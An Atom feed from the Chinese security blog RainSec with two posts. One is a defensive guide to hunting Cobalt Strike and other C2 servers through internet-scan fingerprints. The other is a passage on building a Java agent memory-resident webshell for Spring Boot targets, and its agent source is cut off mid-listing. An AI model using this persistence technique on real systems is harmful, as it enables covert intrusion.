<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>RainSec</title>
  
  
  <link href="https://rainsec.cn/atom.xml" rel="self"/>
  
  <link href="https://rainsec.cn/"/>
  <updated>2023-04-18T12:00:17.211Z</updated>
  <id>https://rainsec.cn/</id>
  
  <author>
    <name>RainSec</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>手把手带你入门之用空间测绘Hunting C2</title>
    <link href="https://rainsec.cn/post/Hunting%20C2.html"/>
    <id>https://rainsec.cn/post/Hunting%20C2.html</id>
    <published>2023-04-06T10:38:45.000Z</published>
    <updated>2023-04-18T12:00:17.211Z</updated>
    
    <content type="html"><![CDATA[<h1 id="手把手带你入门之用空间测绘Hunting-C2"><a href="#手把手带你入门之用空间测绘Hunting-C2" class="headerlink" title="手把手带你入门之用空间测绘Hunting C2"></a>手把手带你入门之用空间测绘Hunting C2</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>笔者最近工作接触到了情报方面，觉得蛮有意思的，就尝试通过空间测绘引擎来Hunting一些C2生产情报，觉得这个流程蛮有意思，开个新坑手把手带你情报入门。</p><h2 id="什么是情报"><a href="#什么是情报" class="headerlink" title="什么是情报"></a>什么是情报</h2><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>威胁情报（Threat Intelligence）是指收集、分析和利用关于各种安全威胁的数据和信息的过程，以帮助组织识别和应对安全威胁。威胁情报可以来自多个来源，包括公共情报、私人情报、开源情报以及企业内部情报</p></blockquote><p>本章中我们可以通过Hunting C2来对捕获到的IP进行一个<code>C2</code>标签的加，这样该IP就可以作为一个恶意IP进入到我们的情报库中。</p><p>此外对于某些集中攻击、流量特征明显或者针对具体行业的攻击者还可以具象化为一个家族或者团伙，以Cobalt Strike为例，<code>Ryuk</code>，<code>Conti</code>，<code>Egregor</code>和<code>DoppelPaymer</code>等几种勒索软件已经开始使用Cobalt Strike来加速其<strong>勒索软件</strong>部署。根据思科的报告显示，66%的勒索软件攻击涉及Cobalt Strike。</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>Hunting C2最重要的工作就是调研一下C2服务器或者行为的一些特征，就像出去钓鱼，不同的鱼生活的环境、季节、水质情况等条件都要明确。</p><p>还是以Cobalt Strike为例，这里给出几种常见的Hunting CS服务器时关注的点：</p><pre class="line-numbers language-none"><code class="language-none">Cobalt Strike BeaconSSL证书和序列号默认404未找到响应默认端口50050和Banner Hash默认SSH客户端HashJA3指纹、JA3S指纹和JARM TLS指纹网站的HTML Hash读懂C2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于笔者妹有Fofa账号（Big 穷逼一个），所以本文以shadon和Quake为例</p><h2 id="开始Hunting"><a href="#开始Hunting" class="headerlink" title="开始Hunting"></a>开始Hunting</h2><h3 id="Cobalt-Strike-Beacon"><a href="#Cobalt-Strike-Beacon" class="headerlink" title="Cobalt Strike Beacon"></a>Cobalt Strike Beacon</h3><p>Shodan已经将”Cobal Strike Beacon”添加到了<code> Shodan Product</code>字段的值列表中，所以可以直接通过语法<code>product:"Cobalt Strike Beacon"</code></p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/picx-images-hosting@master/20230406/image-20230406113440102.613znzx3c1c0.png"></p><p>笔者在写文章时能够Hunting到的CS服务器有1200+，其中中国和美国以及中国香港行政区是出现C2服务器最多的三个地方</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/picx-images-hosting@master/20230406/image-20230406113707264.1nvscjmai18g.png"></p><p><del>（小声BB：它们的默认页面返回都是404 Not Found哦）</del></p><p><code>80</code>、<code>443</code> 和<code>8443</code>是出现次数TOP3的端口</p><p>除此之外还可以看到在世界各地托管Cobalt Strike服务器的主要ISP是谁，腾讯和阿里巴巴真是一路领先</p><p>这种非常精确的特定搜索将用于在一些技术中确定CS服务器的独特属性</p><h3 id="SSL证书和序列号"><a href="#SSL证书和序列号" class="headerlink" title="SSL证书和序列号"></a>SSL证书和序列号</h3><p>Cobalt Strike本身是附带用于HTTPS通信的默认SSL证书的，所以可以通过Hunting SSL证书的值来搜索CS服务器。</p><pre class="line-numbers language-none"><code class="language-none">默认证书: md5:950098276A495286EB2A2556FBAB6D83sha1:6ECE5ECE4192683D2D84E25B0BA7E04F9CB7EB7Csha256:87F2085C32B6A2CC709B365F55873E207A9CAA10BFFECF2FD16D3CF9D94D390C默认序列号:ssl.cert.serial:146473198<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以可以使用<code>ssl:"6ECE5ECE4192683D2D84E25B0BA7E04F9CB7EB7C"</code>或者<code>ssl.cert.serial:"146473198"</code>进行查询</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/picx-images-hosting@master/20230406/image-20230406114616366.4zbpku2emr40.png"></p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/picx-images-hosting@master/20230406/image-20230406114848496.1b424hq6ks1s.png"></p><p>发现了吗，通过SHA1和通过Cert号搜索的结果是相同的，这是因为这两个字段链接在一起。</p><p>我们还可以加上之前的<code>product</code>字段查看CS出现的cert指纹趋势</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/picx-images-hosting@master/20230406/image-20230406115331386.1p8bvycpo8bk.png"></p><p>大多数都是使用的默认证书，SSL 指纹是唯一的并且与Cobalt Strike特别相关，但是默认证书可以替换为有效的 SSL 证书，或者可以使用 Malleable C2 配置文件更改其参数（上面有一些不一样的cert就可以看出这一点）,除此之外还有不同的序列号：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/picx-images-hosting@master/20230406/image-20230406115741012.7ey3pyccjq80.png"></p><h3 id="默认404未找到响应"><a href="#默认404未找到响应" class="headerlink" title="默认404未找到响应"></a>默认404未找到响应</h3><p>上面的方法我们Hunting到的CS服务器可以看到默认全都是404，所以我们也可以从这个点去入手，但是对于结果需要谨慎的进行后续判断。</p><p>Cobalt Strike服务器默认的404 Not Found HTTP响应标头的<code>Content-Length</code>为 0，<code>Content-Type</code>为 <code>text/plain</code>，如下所示</p><pre class="line-numbers language-none"><code class="language-none">HTTP/1.1 404 Not FoundContent-Type: text/plainContent-Length: 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>所以可以结合这三处特征使用<code>"HTTP/1.1 404 Not Found Date:" "Content-Type: text/plain" "Content-Length</code>进行搜索</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/picx-images-hosting@master/20230406/image-20230406135438418.5hbwd6kmeeo0.png"></p><p>有亿点小多。。。</p><p>攻击者可以通过不同的方式逃避这种检测方法，例如通过使用可拓展的C2配置文件更改默认响应，或者调整服务器参数和标头数据以使其与合法服务器保持一致。所以这种方式需要进行手续的威胁分析，这个本篇暂时不考虑。</p><h3 id="默认端口50050和Banner-Hash"><a href="#默认端口50050和Banner-Hash" class="headerlink" title="默认端口50050和Banner Hash"></a>默认端口50050和Banner Hash</h3><p>CS服务器可以默认接收TCP 50050上的客户端连接</p><p>我们通过<code>port:50050</code>进行搜索：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/picx-images-hosting@master/20230406/image-20230406144140325.79d1fnuhbo00.png"></p><p>75w条的数据基数过于庞大，这时候的数据我们是不可以拿来投入生产的，需要进行更多的过滤，其中的一个方法就是对<code>banner</code>的hash做限制，CS默认的hash（2007783223）可以在这里作为过滤条件</p><p>所以我们的条件变更为<code>port:50050 hash:-2007783223</code></p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/picx-images-hosting@master/20230406/image-20230406144955761.iipscpxe260.png"></p><p>加上hash的限制之后直接锐减到19条，我焯</p><p>19条的数据人工去判断的成本也是完全可以接受的，quake目前好像不支持hash的搜索，这里就不展示了</p><h3 id="默认SSH客户端Hash"><a href="#默认SSH客户端Hash" class="headerlink" title="默认SSH客户端Hash"></a>默认SSH客户端Hash</h3><p>依托于项目[hassh](<a href="https://github.com/salesforce/hassh">salesforce/hassh: HASSH is a network fingerprinting standard which can be used to identify specific Client and Server SSH implementations. The fingerprints can be easily stored, searched and shared in the form of a small MD5 fingerprint. (github.com)</a>),我们可以计算SSH客户端的信息，然后通过搜索这些hash相关的IP来捕获一些恶意IP，这里使用<code>greynoise</code>进行搜索，这个东西感觉和微步在线X情报社区搜IP的时候的那个IP画像功能差不多，有对IP打的tag。</p><pre class="line-numbers language-none"><code class="language-none">hassh(CobaltStrike_SSH-client) = a7a87fbe86774c2e40cc4a7ea2ab1b3crelated to: SSH-2.0-libssh2_1.8.0 || SSH-2.0-libssh2_1.7.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>[搜索](<a href="https://viz.greynoise.io/query?gnql=raw_data.hassh.fingerprint:a7a87fbe86774c2e40cc4a7ea2ab1b3c">Query Results | GreyNoise Visualizer</a>)</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/picx-images-hosting@master/20230406/image-20230406145749547.401fcm8y4f40.png"></p><p>可以看到结果中已经有被标记为恶意的CS SSH CLIENT的数据了，但是和之前不同，TOP榜里的地区居然不是中国第一名了。。。。</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/picx-images-hosting@master/20230406/image-20230406145900919.1glocgfyj6w0.png"></p><h3 id="JA3的指纹们"><a href="#JA3的指纹们" class="headerlink" title="JA3的指纹们"></a>JA3的指纹们</h3><h4 id="JA3"><a href="#JA3" class="headerlink" title="JA3"></a>JA3</h4><p>JA3是一个开源项目，可以为客户端和服务器之间的通信创建SSL指纹。这些独特的签名可以代表客户端Hello数据包中的多个字段值。</p><p>与CS相关的已知JA3签名包括以下内容。例如，CS的Beacon使用Windows套接字来启动TLS通信,但是这种方法并不特定于Cobalt Strike。</p><h4 id="JA3S"><a href="#JA3S" class="headerlink" title="JA3S"></a>JA3S</h4><p>在创建了JA3之后，为TLS握手服务器端指纹创建了一种新的方法，即TLS服务器Hello消息。JA3S方法是收集以下字段在服务器Hello数据包中的字节的十进制值：版本、可接受的加密方式和扩展列表。</p><p>可以从已知的C2列表中提取所有的JA3S以对它们进行聚类，并基于其他相似之处扩大搜索范围。但是这超出了本文的范围，存在太多的误报风险。</p><p>这里结合<code>product</code>字段贴出出现频率比较高的指纹</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/picx-images-hosting@master/20230406/image-20230406150442410.6iy2okcv10g0.png"></p><h4 id="JARM"><a href="#JARM" class="headerlink" title="JARM"></a>JARM</h4><p>与JA3/JA3S类似，JARM能够对远程服务器的TLS数值进行指纹识别。它通过与目标服务器进行交互发送10个TLS客户端Hello数据包，并记录回复中的特定属性。然后，它将哈希结果值并创建最终的JARM指纹。</p><p>但是如果使用JARM扫描Cobalt Strike服务器，获得的结果取决于服务器所使用的Java版本。CS的文档中建议使用时首选OpenJDK 11。这使得容易识别潜在的Cobalt Strike服务器，但是也容易产生误报。<del>（Java的东西在互联网上真是太多了）</del></p><p>默认配置的Cobalt Strike对应的JARM指纹是<code>07d14d16d21d21d00042d41d00041de5fb3038104f457d92ba02e9311512c2</code></p><p>搜索如下：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/picx-images-hosting@master/20230406/image-20230406150942842.b4nzw2x47fs.png"></p><p>其他与Cobalt Strike服务器有关的JARM如下，更多JARM指纹可以参考[JARM](<a href="https://github.com/carbonblack/active_c2_ioc_public/blob/main/cobaltstrike/JARM/jarm_cs_202107_uniq_sorted.txt">active_c2_ioc_public/jarm_cs_202107_uniq_sorted.txt at main · carbonblack/active_c2_ioc_public (github.com)</a>)：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/picx-images-hosting@master/20230406/image-20230406151039740.2on56795c0q0.png"></p><p>这种方法容易出现许多误报，并且只能帮助你了解一个IP是否可能与CS有关，工作中不要将其作为主要方法。</p><h3 id="拓展网站的HTML-Hash"><a href="#拓展网站的HTML-Hash" class="headerlink" title="拓展网站的HTML Hash"></a>拓展网站的HTML Hash</h3><p>Shodan的爬虫可以计算网站的Hash。要找到相同的网站，可以使用http.html_hash，它是网站HTML的Hash。也可以使用这个[工具](<a href="https://github.com/ninoseki/apullo">ninoseki/apullo: A scanner for taking basic fingerprints (github.com)</a>)生成哈希值。</p><p>根据CS服务器的配置方式，哈希值可能基于默认设置为null。如果攻击者修改了默认配置，那么就会生成Hash。可以在html_hash上进行判断，以找出具有相同哈希值的其服务器。</p><p>例如我们首先使用<code>product</code>字段查看已经明确的CS服务器的html hash：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/picx-images-hosting@master/20230406/image-20230406152318659.32hc65tk27.png"></p><p>可以看到有一条hash为<code>2101032290</code>的数据，然后我们去除<code>product</code>标签直接进行搜索：</p><p><code>http.html_hash:"2101032290"</code></p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/picx-images-hosting@master/20230406/image-20230406152456003.5jlbu44hbsw0.png"></p><p>可以看到结果有17条，后续就可以将刚才三条过滤掉对剩下的14条进行分析和确认。</p><p>同样的，这个思路还可以被用在<code>HTTP Header hash</code></p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/picx-images-hosting@master/20230406/image-20230406152701128.4nwmfsuforg0.png"></p><p>例如这个<code>316618825</code>，按照上面所说的思路进行拓展之后：</p><p><code>http.headers_hash:"316618825"</code></p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/picx-images-hosting@master/20230406/image-20230406152856180.3926dztng840.png"></p><h3 id="读懂C2"><a href="#读懂C2" class="headerlink" title="读懂C2"></a>读懂C2</h3><p>这条方法主要是针对一些开源的C2框架或者能够搞到源码的C2，例如<code>HavocFramework</code></p><p>通过观察HavocFramework的代码，可以看到[代码](<a href="https://github.com/HavocFramework/Havoc/blob/1248ff9ecc964325447128ae3ea819f1ad10b790/Teamserver/pkg/common/certs/https.go#L95">Havoc/https.go at 1248ff9ecc964325447128ae3ea819f1ad10b790 · HavocFramework/Havoc (github.com)</a>)中存在定义：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">orgNames <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>string<span class="token punctuation">{</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">"ACME"</span><span class="token punctuation">,</span>    <span class="token string">"Partners"</span><span class="token punctuation">,</span>    <span class="token string">"Tech"</span><span class="token punctuation">,</span>    <span class="token string">"Cloud"</span><span class="token punctuation">,</span>    <span class="token string">"Synergy"</span><span class="token punctuation">,</span>    <span class="token string">"Test"</span><span class="token punctuation">,</span>    <span class="token string">"Debug"</span><span class="token punctuation">,</span><span class="token punctuation">}</span>orgSuffixes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>string<span class="token punctuation">{</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">"co"</span><span class="token punctuation">,</span>    <span class="token string">"llc"</span><span class="token punctuation">,</span>    <span class="token string">"inc"</span><span class="token punctuation">,</span>    <span class="token string">"corp"</span><span class="token punctuation">,</span>    <span class="token string">"ltd"</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这其中就包含了生成的证书：ACME、Partners、Tech、Cloud、Synergy、Test、Debug</p><p>我们使用其中的一个特征来进行搜索</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/picx-images-hosting@master/20230406/image-20230406160626037.3ohiiq4ulqm0.png"></p><p>同时，sliver也使用了这几种随机的org，[代码](sliver/subject.go at 97d3da75b6e24defb3a2a97443a15a632b3a8448 · BishopFox/sliver (github.com))</p><p>通过列表中的属性能够方便我们快速确定一台C2服务器</p><h2 id="其他的“歪门邪道”"><a href="#其他的“歪门邪道”" class="headerlink" title="其他的“歪门邪道”"></a>其他的“歪门邪道”</h2><p>Quake支持对相应包的搜索，所以我们可以寻找到一些在互联网上开放了目录的服务器，查看其中的内容</p><p>打开目录页面标题主要由正在使用的 Web 服务器决定。如果它是一个 Apache2 服务器，标题将是“Index of /”，如果它是一个 Python HTTP 服务器，内容将会是目录列表</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/picx-images-hosting@master/20230406/image-20230406162221830.2q4iegvp2wy0.png"></p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/picx-images-hosting@master/20230406/image-20230406162241139.1tauenzfghmo.png"></p><p>攻击者通常倾向于使用Python搭建临时HTTP文件服务器，但是有时他们会忘记及时关闭Python HTTP服务器，导致我们可以通过HTTP响应进行过滤。例如我们可以输入任何安全工具或恶意软件的名称来进行过滤：</p><p><code>title: "Directory listing for /" and response:"cobaltstrike"</code></p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/picx-images-hosting@master/20230406/image-20230406163112762.13kzjybm42n4.png"></p><p>看到目前或曾经有68个服务器托管了Cobalt Strike供攻击者下载</p><p><code>title: "Directory listing for /" and response:"mimikatz"</code></p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/picx-images-hosting@master/20230406/image-20230406163729176.5knj6jimp2s0.png"></p><p><code>title: "Directory listing for /" and response:"exp"</code></p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/picx-images-hosting@master/20230406/image-20230406163822103.3bl98n5rj0k0.png"></p><p>碰巧逮到个没关的</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/picx-images-hosting@master/20230406/image-20230406163851107.3a6jpttkl5s0.png"></p><p>虽然妹有C2，但也是个用于托管恶意代码的服务器，可以将样本下载进行分析</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>由于作者比较菜，所以这里给出的方式还是比较少的，后续等弟弟精进一下分享些高级的Hunting手法</p><p>其中分享的手法有的只能用来进行辅助判断，在实际的生产时需要考虑误报的情况，毕竟情报误报还是比</p><p>较严重的。</p><p>其中还有一些手法例如通过地区、托管的服务商、Nmap扫描等大家感兴趣可以拓展一下。</p><p>（希望各位大师傅不吝赐教，轻喷</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://gustavshen.medium.com/">Gustav Shen – Medium</a></li><li><a href="https://twitter.com/MichalKoczwara">Michael Koczwara (@MichalKoczwara) / Twitter</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;手把手带你入门之用空间测绘Hunting-C2&quot;&gt;&lt;a href=&quot;#手把手带你入门之用空间测绘Hunting-C2&quot; class=&quot;headerlink&quot; title=&quot;手把手带你入门之用空间测绘Hunting C2&quot;&gt;&lt;/a&gt;手把手带你入门之用空间测绘Hunt</summary>
      
    
    
    
    <category term="情报" scheme="https://rainsec.cn/categories/%E6%83%85%E6%8A%A5/"/>
    
    
    <category term="Hunting" scheme="https://rainsec.cn/tags/Hunting/"/>
    
  </entry>
  
  <entry>
    <title>初识Java agent类型内存马</title>
    <link href="https://rainsec.cn/post/Java%20Agent.html"/>
    <id>https://rainsec.cn/post/Java%20Agent.html</id>
    <published>2023-03-30T10:38:45.000Z</published>
    <updated>2023-04-12T02:36:51.355Z</updated>
    
    <content type="html"><![CDATA[<h2 id="初识Java-agent类型内存马"><a href="#初识Java-agent类型内存马" class="headerlink" title="初识Java agent类型内存马"></a>初识Java agent类型内存马</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>你是否遇到过这样的场景，springboot环境下各种反序列化的点，但是可用的反序列化链不能直接加载类打入内存马，只能执行系统命令，甚至目标环境不出网，或者已经反弹shell或cs上线成功了，但是想要注入一个webshell。这时候就需要用到agent类型内存马了。</p><h3 id="前置知识点"><a href="#前置知识点" class="headerlink" title="前置知识点"></a>前置知识点</h3><p>JavaAgent 是JDK 1.5 以后引入的，可以在Java程序运行之前或运行期间修改类的字节码，Java agent可以是一个编译好的jar文件，使用方式有两种：<br>-实现premain方法，在JVM启动前加载。<br>-实现agentmain方法，在JVM启动后加载。(jdk 1.6 之后提供)<br>实现了premain方法的agent 就可以在启动Java程序时使用 -javaagent 参数来加载。<br>实现了agentmain方法的agent可以通过进程pid来连接到启动后的Java程序上。<br>agentmain方法声明如下，拥有Instrumentation inst参数的方法优先级更高：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">premain</span><span class="token punctuation">(</span><span class="token class-name">String</span> agentArgs<span class="token punctuation">,</span> <span class="token class-name">Instrumentation</span> inst<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">premain</span><span class="token punctuation">(</span><span class="token class-name">String</span> agentArgs<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一个参数String agentArgs就是Java agent的参数。<br>第二个参数Instrumentaion inst比较重要，有三个需要用到的方法：</p><ol><li>getAllLoadedClasses:获取目标已经加载的类。</li><li>addTransformer:增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。</li><li>retransformClasses: 在类加载之后，重新定义 Class。</li></ol><p>Agent实现主要依靠VirtualMachine和VirtualMachineDescriptor这两个类</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">VirtualMachine</span><span class="token class-name">VirtualMachine</span>可以来实现获取系统信息，内存dump、现成dump、类信息统计（例如JVM加载的类）。<span class="token class-name">Attach</span>：允许我们通过给attach方法传入一个jvm的<span class="token function">pid</span><span class="token punctuation">(</span>进程id<span class="token punctuation">)</span>，远程连接到jvm上loadAgent：向jvm注册一个代理程序agent，在该agent的代理程序中会得到一个<span class="token class-name">Instrumentation</span>实例，该实例可以 在<span class="token keyword">class</span>加载前改变<span class="token keyword">class</span>的字节码，也可以在<span class="token keyword">class</span>加载后重新加载。在调用<span class="token class-name">Instrumentation</span>实例的方法时，这些方法会使用<span class="token class-name">ClassFileTransformer</span>接口中提供的方法进行处理。<span class="token class-name">Detach</span>：解除<span class="token class-name">Attach</span><span class="token class-name">VirtualMachineDescriptor</span>​ <span class="token class-name">VirtualMachineDescriptor</span>是用于描述 <span class="token class-name">Java</span> 虚拟机的容器类。它封装了一个标识目标虚拟机的标识符，以及一个<span class="token class-name">AttachProvider</span>在尝试连接到虚拟机时应该使用的引用。标识符依赖于实现，但通常是进程标识符（或 pid）环境，其中每个 <span class="token class-name">Java</span> 虚拟机在其自己的操作系统进程中运行。​ <span class="token class-name">VirtualMachineDescriptor</span>实例通常是通过调用<span class="token class-name">VirtualMachine</span><span class="token punctuation">.</span><span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 方法创建的。这将返回描述所有已安装 <span class="token class-name">Java</span> 虚拟机的完整描述符列表attach providers。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>jar包中的MANIFEST.MF 文件必须指定 Agentmain-Class 项，Agentmain-Class 指定的那个类必须实现 agentmain() 方法</p><h3 id="编写一个agent-jar"><a href="#编写一个agent-jar" class="headerlink" title="编写一个agent.jar"></a>编写一个agent.jar</h3><p>笔者在github找了好久，基本是一些本地调试用的demo，没找到能直接能用的且较为通用的。所以就在 ethushiroha师傅 项目 JavaAgentTools BehindShell 的基础上进行修改。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>spring</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>instrument<span class="token punctuation">.</span></span><span class="token class-name">Instrumentation</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>instrument<span class="token punctuation">.</span></span><span class="token class-name">UnmodifiableClassException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">MalformedURLException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> m <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token class-name">TransformedClassName</span> <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">c<span class="token punctuation">.</span></span>SpringMemShellConfig<span class="token punctuation">.</span>TransformedClassName</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Instrumentation</span> i <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">agentmain</span><span class="token punctuation">(</span><span class="token class-name">String</span> agentArgs<span class="token punctuation">,</span> <span class="token class-name">Instrumentation</span> inst<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">UnmodifiableClassException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token comment">//启动方法</span>        i <span class="token operator">=</span> inst<span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Agent load ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">UnmodifiableClassException</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token 